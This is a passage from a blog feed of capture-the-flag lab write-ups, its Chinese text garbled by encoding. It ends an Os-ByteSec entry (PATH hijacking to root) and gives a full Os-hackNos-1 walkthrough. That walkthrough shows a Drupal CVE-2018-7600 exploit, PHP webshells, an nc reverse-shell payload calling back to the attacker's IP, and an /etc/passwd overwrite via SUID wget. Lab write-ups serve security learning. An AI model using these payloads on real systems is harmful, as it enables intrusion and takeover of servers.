:::*                    LISTEN      1153/sshd       </span><br><span class="line">tcp6       0      0 :::445                  :::*                    LISTEN      1010/smbd       </span><br><span class="line">tcp6       0      0 :::139                  :::*                    LISTEN      1010/smbd       </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      1264/apache2 </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>xxd /usr/bin/netscan</code>æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå‘ç°ç¡®å®è°ƒç”¨äº†netstat -natpã€‚</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-ByteSec/image-20230628230353627.png" alt="image-20230628230353627"></p><p>é‚£ä¹ˆå°è¯•ç”¨è¿™ä¸ªå‘½ä»¤è¿›è¡Œææƒï¼Œæ³¨æ„è¿™é‡Œå†™å…¥çš„æ–‡ä»¶æ˜¯netstatè€Œä¸æ˜¯netscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">blackjax@nitin:~$ cd /tmp</span><br><span class="line">blackjax@nitin:/tmp$ echo &quot;/bin/bash&quot; &gt;netstat</span><br><span class="line">blackjax@nitin:/tmp$ chmod 775 netstat</span><br><span class="line">blackjax@nitin:/tmp$ export PATH=/tmp:$PATH</span><br><span class="line">blackjax@nitin:/tmp$ netscan</span><br><span class="line">root@nitin:/tmp# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(blackjax)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å¾—æœ€åçš„root.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@nitin:/tmp# cat /root/root.txt </span><br><span class="line">    ____  ____  ____  ______   ________    ___   ______</span><br><span class="line">   / __ \/ __ \/ __ \/_  __/  / ____/ /   /   | / ____/</span><br><span class="line">  / /_/ / / / / / / / / /    / /_  / /   / /| |/ / __  </span><br><span class="line"> / _, _/ /_/ / /_/ / / /    / __/ / /___/ ___ / /_/ /  </span><br><span class="line">/_/ |_|\____/\____/ /_/____/_/   /_____/_/  |_\____/   </span><br><span class="line">                     /_____/                           </span><br><span class="line">Conguratulation..</span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Author : Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">Contact : https://www.linkedin.com/in/rahulgehlaut/</span><br><span class="line"></span><br><span class="line">WebSite : jameshacker.me</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>ææƒæ‰€ç”¨çš„å‘½ä»¤æ˜¯netcanï¼Œnetscanè°ƒç”¨çš„å‘½ä»¤æ˜¯netstatï¼Œæ‰€ä»¥ç”¨netstatæ¥åŠ«æŒç¯å¢ƒå˜é‡ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Os-hackNos-1</title>
      <link href="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/"/>
      <url>/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Os-hackNos-1"><a href="#Os-hackNos-1" class="headerlink" title="Os-hackNos-1"></a>Os-hackNos-1</h1><p>é¶æœºä¸‹è½½ <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401">https://www.vulnhub.com/entry/hacknos-os-hacknos,401</a></p><p>ç›®æ ‡ä¸º æ™®é€šç”¨æˆ·çš„<strong>user.txt</strong>å’Œrootç”¨æˆ·çš„<strong>root.txt</strong></p><h2 id="é¶æœºé…ç½®"><a href="#é¶æœºé…ç½®" class="headerlink" title="é¶æœºé…ç½®"></a>é¶æœºé…ç½®</h2><p>åœ¨å°†é¶æœºæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ä¸ºOs-hackNos-1.ova</p><p>ä½¿ç”¨vmæ‰“å¼€è¿™ä¸ªovaæ–‡ä»¶è¿›è¡Œå¯¼å…¥ã€‚å¯¼å…¥å®Œæˆåï¼Œè‹¥æ˜¯é‡åˆ°æ— æ³•è·å–ipåœ°å€ï¼Œåˆ™éœ€è¦åœ¨å¯åŠ¨ç•Œé¢ç‚¹å‡»shiftè¿›å…¥å¦‚ä¸‹ç•Œé¢æŒ‰ä¸‹e</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628231828025.png" alt="image-20230628231828025"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ä¸‹ç¿»åŠ¨ï¼Œå°†roæ”¹ä¸ºrw single init=/bin/bash</span><br></pre></td></tr></table></figure><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628231856200.png" alt="image-20230628231856200"></p><p>ç„¶åæŒ‰ä¸‹ ctrl+xè¿›å…¥shell</p><p>ä½¿ç”¨ip aæŸ¥çœ‹ipåœ°å€</p><p>è‹¥å‘ç°æ— ipåœ°å€ï¼Œåˆ™è®°ä½ç½‘å¡åç§°ï¼Œè¿™é‡Œæ˜¯ens33</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628231909760.png" alt="image-20230628231909760"></p><p>ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>å¯¹ç½‘å¡ä¿¡æ¯è¿›è¡Œç¼–è¾‘</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628231926804.png" alt="image-20230628231926804"></p><p>å¦‚æœåœ¨ä½¿ç”¨vim &#x2F;etc&#x2F;network&#x2F;interfacesæ²¡æœ‰å¦‚ä¸Šä¿¡æ¯ï¼Œåˆ™éœ€è¦é‡æ–°å¯¼å…¥ovaï¼Œå³åˆ æ‰æ­¤è™šæ‹Ÿæœºï¼Œé‡æ–°ä½¿ç”¨vmæ‰“å¼€ovaå¹¶å¯¼å…¥ã€‚</p><p>ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure><p>è¿›è¡Œç½‘å¡é‡å¯</p><p>è‹¥æ˜¯è¿”å›networkingæ²¡æ‰¾åˆ°æ­¤å‘½ä»¤ï¼Œè¯æ˜ovaå¯¼å…¥æ—¶æ–‡ä»¶ç¼ºå¤±ï¼Œéœ€è¦é‡æ–°å¯¼å…¥ovaã€‚</p><h2 id="è¿›è¡Œæ¸—é€"><a href="#è¿›è¡Œæ¸—é€" class="headerlink" title="è¿›è¡Œæ¸—é€"></a>è¿›è¡Œæ¸—é€</h2><p>é¶æœºå’Œkaliåœ¨åŒä¸€ä¸ªç½‘æ®µã€‚</p><p>ä½¿ç”¨nmapå¯¹æ­¤ç½‘æ®µè¿›è¡Œæ‰«æ</p><p>nmap 192.168.5.0&#x2F;24 -O </p><p>å…¶ä¸­é¶æœºçš„ä¿¡æ¯å¦‚ä¸‹ </p><p>Nmap scan report for 192.168.5.132<br>Host is up (0.00047s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE<br>22&#x2F;tcp open  ssh<br>80&#x2F;tcp open  http<br>MAC Address: 00:0C:29:B0:11:06 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop</p><p>å…¶ä¸­80ç«¯å£å¼€å¯äº†</p><p><strong>åˆ™è¿™é‡Œé¶æœºipåœ°å€ä¸º192.168.5.132</strong></p><p>æ•…å­˜åœ¨ç½‘é¡µï¼Œåˆ™ä½¿ç”¨dirsearchè¿›è¡Œç›®å½•æ‰«æ</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628231946258.png" alt="image-20230628231946258"></p><p>å‘ç°<a href="http://192.168.5.132/drupal/%E5%B9%B6%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE">http://192.168.5.132/drupal/å¹¶è¿›è¡Œè®¿é—®</a></p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232004225.png" alt="image-20230628232004225"></p><p>é€šè¿‡ <a href="http://192.168.0.142/drupal/CHANGELOG.txt">http://192.168.0.142/drupal/CHANGELOG.txt</a> å¾—çŸ¥grupalçš„ç‰ˆæœ¬ä¸º Drupal 7.57</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232023925.png" alt="image-20230628232023925"></p><p>åœ¨ç™¾åº¦ç­‰æœç´¢å¼•æ“ä¸­æœç´¢è¯¥ç‰ˆæœ¬çš„æ¼æ´ï¼Œæ‰¾åˆ°CVE-2018-7600</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232037744.png" alt="image-20230628232037744"></p><p>åœ¨githubä¸­ä¸‹è½½è¯¥æ¼æ´çš„exp</p><p><a href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p><p>git clone <a href="https://github.com/pimps/CVE-2018-7600.git">https://github.com/pimps/CVE-2018-7600.git</a></p><p>åœ¨kaliä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line">python3 drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls</span><br></pre></td></tr></table></figure><p>å³å¯æ‰§è¡Œlsè¯»å–æ–‡ä»¶</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232052599.png" alt="image-20230628232052599"></p><p>åœ¨å½“å‰ç›®å½•å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p>è¿™é‡Œå‚è€ƒçš„moonsecçš„</p><p>moon.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_POST[&#x27;moon&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†™è‡ªå·±çš„webshell</p><p>php.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;qwer&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>åè€…å¯ä»¥é€šè¿‡èœåˆ€ä¹‹ç±»çš„webshellå·¥å…·è¿›è¡Œè¿æ¥</p><p>è¿™é‡Œç”¨å“¥æ–¯æ‹‰è¿›è¡Œè¿æ¥</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232108952.png" alt="image-20230628232108952"></p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232130003.png" alt="image-20230628232130003"></p><p>æˆ–è€…é‡‡ç”¨ç¬¬ä¸€ç§(å³moonçš„æ–¹å¼)è¿›è¡Œåå¼¹shell</p><p>ç„¶ååœ¨å½“å‰ç›®å½•å¼€å¯pythonè‡ªå¸¦çš„httpserver</p><p>python -m SimpleHTTPServer</p><p>ç„¶åä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c &quot;wget http://192.168.5.129:8000/moon.php&quot;   </span><br></pre></td></tr></table></figure><p>å°†phpæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºä¸Š</p><p>å†ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹phpæœ¨é©¬æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232146849.png" alt="image-20230628232146849"></p><p>é¦–å…ˆåœ¨kaliä¸­ä½¿ç”¨ncè¿›è¡Œç›‘å¬</p><p>nc -lvnp 9000</p><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®<a href="http://192.168.5.132/drupal/moon.php">http://192.168.5.132/drupal/moon.php</a></p><p>ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…å‡†å¤‡åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /drupal/moon.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.5.132</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: has_js=1</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 91</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">moon=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash++2&gt;%261|nc+192.168.5.129+9000+&gt;/tmp/f</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„ 192.168.5.129ä¸ºkaliçš„ipåœ°å€</p><p>moonåšå®¢é‡Œå†™çš„æ˜¯&#x2F;bin&#x2F;sh -i ä½†æ˜¯æˆ‘åœ¨æµ‹è¯•æ—¶æŠ¥é”™äº†</p><p>rm+&#x2F;tmp&#x2F;f%3bmkfifo+&#x2F;tmp&#x2F;f%3bcat+&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh+â€i+2&gt;%261|nc+192.168.0.136+9001+&gt;&#x2F;tmp&#x2F;f</p><p>æˆ‘è¿™é‡Œæ”¹ä¸º &#x2F;bin&#x2F;bash</p><p>moon&#x3D;rm+&#x2F;tmp&#x2F;f%3bmkfifo+&#x2F;tmp&#x2F;f%3bcat+&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash++2&gt;%261|nc+192.168.5.129+9000+&gt;&#x2F;tmp&#x2F;f</p><p>æäº¤ä¹‹åå¯ä»¥åå¼¹ä¸€ä¸ªshell</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232204943.png" alt="image-20230628232204943"></p><p>æ­¤æ—¶å·²ç»åå¼¹æˆåŠŸ</p><p>ç„¶ååˆ‡æ¢ä¸ºpython3çš„shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232226022.png" alt="image-20230628232226022"></p><p>åœ¨ç½‘ç«™æ ¹ç›®å½•å‘ç°ä¸€ä¸ª<strong>alexander.txt</strong></p><p>ä½¿ç”¨catè·å–å…¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackNos:/var/www/html/drupal$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">www-data@hackNos:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">alexander.txt  drupal  index.html</span><br><span class="line">www-data@hackNos:/var/www/html$ cat alexander.txt</span><br><span class="line">cat alexander.txt</span><br><span class="line">KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‡­å€Ÿç»éªŒçœ‹å‡ºè¿™æ˜¯base64åŠ å¯†çš„æ•°æ®ï¼Œå°†å…¶ä½¿ç”¨base64è§£å¯†</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232243956.png" alt="image-20230628232243956"></p><p>ç„¶åå‘ç°å·¦è¾¹æ˜¯Brainfuck</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232301143.png" alt="image-20230628232301143"></p><p>è§£å¯†ç½‘ç«™å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.splitbrain.org/services/ook</span><br></pre></td></tr></table></figure><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232314924.png" alt="image-20230628232314924"></p><p>ç‚¹å‡»å³ä¸‹è§’Brainfuck to textå³å¯è§£å¯†</p><p>å¾—åˆ°james:hacker@4514</p><p>é€šè¿‡æŸ¥æ‰¾ï¼Œåœ¨homeä¸­æ‰¾åˆ°jameså’Œå…¶ç›®å½•ä¸‹çš„user.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackNos:/home/james$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">   _                                  </span><br><span class="line">  | |                                 </span><br><span class="line"> / __) ______  _   _  ___   ___  _ __ </span><br><span class="line"> \__ \|______|| | | |/ __| / _ \| &#x27;__|</span><br><span class="line"> (   /        | |_| |\__ \|  __/| |   </span><br><span class="line">  |_|          \__,_||___/ \___||_|   </span><br><span class="line">                                      </span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯•ç€ææƒï¼Œå…ˆçœ‹çœ‹suidææƒï¼Œéœ€è¦æœç´¢åˆ°ï¼Œå¸¦æœ‰sçš„æ–‡ä»¶ï¼Œå¼€å§‹æŸ¥æ‰¾ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232332862.png" alt="image-20230628232332862"></p><p>å‘ç°wgetæ™®é€šç”¨æˆ·ä¹Ÿå¯æ‰§è¡Œ</p><p>é‚£ä¹ˆææƒçš„æ–¹å¼å°±æ˜¯é€šè¿‡ä¸‹è½½ç›®æ ‡é¶æœºä¸Šçš„passwdï¼Œç„¶åæ„é€ ä¸€ä¸ªæœ‰rootæƒé™çš„ç”¨æˆ·åŠ å…¥åˆ°æ„é€ çš„passwdæ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨wget -Oå°†å†…å®¹é‡å®šå‘è¾“å…¥åˆ°&#x2F;etc&#x2F;passwdä¸­</p><p>é¦–å…ˆé€šè¿‡cat &#x2F;etc&#x2F;passwdè·å–é¶æœºå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackNos:/var/www/html/drupal$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">james:x:1000:1000:james,,,:/home/james:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">moon:$1$moon$8F2YI9c3zhkkS9SOsKawY0:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>å¤åˆ¶åˆ°æœ¬åœ°ç”Ÿæˆæ–‡ä»¶passwd</p><p>åœ¨kaliä¸­ç”Ÿæˆå¯†ç </p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232349133.png" alt="image-20230628232349133"></p><p>å°†moonåŠ å…¥åˆ°ä¼ªé€ çš„passwdï¼Œå¹¶èµ‹äºˆrootæƒé™</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232408828.png" alt="image-20230628232408828"></p><p>å°†passwdæ”¾åˆ°å¼€å¯äº†python  httpserverçš„æ–‡ä»¶å¤¹ä¸­</p><p>ç„¶åä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c &quot;wget http://192.168.5.129:8000/passwd -O /etc/passwd&quot;  </span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åœ¨å·²æœ‰çš„shellä¸­è¿›è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.5.129:8000/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å·²æœ‰çš„shellä¸­è¿›è¡Œåˆ‡æ¢ç”¨æˆ·</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232454442.png" alt="image-20230628232454442"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@hackNos:/var/www# cd ~</span><br><span class="line">cd ~</span><br><span class="line">root@hackNos:~# ls</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@hackNos:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">    _  _                              _   </span><br><span class="line">  _| || |_                           | |  </span><br><span class="line"> |_  __  _|______  _ __  ___    ___  | |_ </span><br><span class="line">  _| || |_|______|| &#x27;__|/ _ \  / _ \ | __|</span><br><span class="line"> |_  __  _|       | |  | (_) || (_) || |_ </span><br><span class="line">   |_||_|         |_|   \___/  \___/  \__|</span><br><span class="line">                                          </span><br><span class="line">                                          </span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Author : Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">Linkedin : https://www.linkedin.com/in/rahulgehlaut/</span><br><span class="line"></span><br><span class="line">Blog : www.hackNos.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>ä½¿ç”¨èœåˆ€ç­‰webshellä¸èƒ½åˆ‡æ¢ï¼Œå› ä¸ºsuå‘½ä»¤å¿…é¡»åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œ</p><p>su: must be run from a terminal</p><p><img src="/bilibiliganb.github.io/2023/10/19/Os-hackNos-1/image-20230628232523339.png" alt="image-20230628232523339"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hello-world</title>
      <link href="/bilibiliganb.github.io/2023/10/19/hello-world/"/>
      <url>/bilibiliganb.github.io/2023/10/19/hello-world/</url>
      
